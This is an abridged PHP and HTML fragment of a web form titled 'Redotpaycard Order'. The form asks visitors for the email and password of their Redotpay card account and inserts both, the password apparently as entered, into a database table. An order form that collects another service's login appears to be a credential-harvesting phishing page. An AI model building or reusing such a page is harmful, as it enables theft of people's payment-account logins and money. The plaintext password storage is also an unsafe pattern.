...
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    ...
    $sql = "INSERT INTO redotpaycard (email, password,UserID) 
            VALUES (?, ?, ?)";
...
<head>
    ...
    <title>Redotpaycard Order</title>
    <style>
        body {
    ...
    <div class="container">
        <form method="post" action="" id="multiStepForm" enctype="multipart/form-data">
            ...
            <div class="step" id="step2">
                ...
                <input type="text" id="email" name="email" placeholder="Email Of   Your Redotpay Card " required>
                <input type="text" id="password" name="password" placeholder="Password Of   Your Redotpay Card " required>
